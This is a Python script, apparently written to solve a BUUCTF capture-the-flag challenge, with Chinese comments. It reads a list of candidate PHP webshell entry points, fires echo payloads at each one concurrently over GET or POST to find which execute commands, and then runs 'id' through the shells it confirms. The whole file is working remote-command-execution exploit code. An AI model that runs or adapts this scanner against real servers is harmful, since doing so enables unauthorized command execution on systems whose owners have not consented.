#!/usr/bin/env python3
import os
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://c634db44-d1b4-41fc-aba6-f55bb15ac0e5.node5.buuoj.cn:81"

# 测试命令 - 输出一个唯一标识
TEST_OUTPUT = "SHELLTEST12345"

def test_shell(file, func, method, param):
    """测试单个 shell 是否能执行命令"""
    url = f"{BASE_URL}/{file}"
    
    # 根据函数类型选择测试方式
    if func == 'system':
        payload = f"echo {TEST_OUTPUT}"
    elif func == 'exec':
        # exec 不直接输出，需要用 echo 包装
        payload = f"echo {TEST_OUTPUT}"
    elif func == 'shell_exec':
        payload = f"echo {TEST_OUTPUT}"
    elif func == 'passthru':
        payload = f"echo {TEST_OUTPUT}"
    elif func == 'eval':
        # eval 需要完整 PHP 代码
        payload = f"echo '{TEST_OUTPUT}';"
    elif func == 'assert':
        # assert 在 PHP 7 中行为改变，尝试直接执行
        payload = f"echo '{TEST_OUTPUT}';"
    else:
        payload = f"echo {TEST_OUTPUT}"
    
    try:
        if method == 'GET':
            resp = requests.get(url, params={param: payload}, timeout=5)
        else:
            resp = requests.post(url, data={param: payload}, timeout=5)
        
        if TEST_OUTPUT in resp.text:
            return True, file, func, method, param, resp.text[:200]
        return False, file, func, method, param, None
    except Exception as e:
        return False, file, func, method, param, str(e)

def main():
    # 读取 potential_shells.txt
    shells = []
    with open('potential_shells.txt', 'r') as f:
        for line in f:
            parts = line.strip().split(':')
            if len(parts) == 5:
                shells.append({
                    'file': parts[0],
                    'line': parts[1],
                    'func': parts[2],
                    'method': parts[3],
                    'param': parts[4]
                })
    
    print(f"共有 {len(shells)} 个 shell 待测试")
    
    # 并发测试
    working_shells = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for s in shells[:500]:  # 先测试前 500 个
            futures.append(executor.submit(test_shell, s['file'], s['func'], s['method'], s['param']))
        
        for future in as_completed(futures):
            success, file, func, method, param, output = future.result()
            if success:
                print(f"[+] 找到有效 shell: {file} - {func}({method}['{param}'])")
                working_shells.append((file, func, method, param))
    
    print(f"\n找到 {len(working_shells)} 个有效 shell")
    
    # 测试有效 shell 执行命令
    for file, func, method, param in working_shells[:5]:
        print(f"\n测试 {file} 执行 id 命令:")
        url = f"{BASE_URL}/{file}"
        if method == 'GET':
            resp = requests.get(url, params={param: 'id'}, timeout=5)
        else:
            resp = requests.post(url, data={param: 'id'}, timeout=5)
        print(resp.text[-500:])

if __name__ == '__main__':
    main()
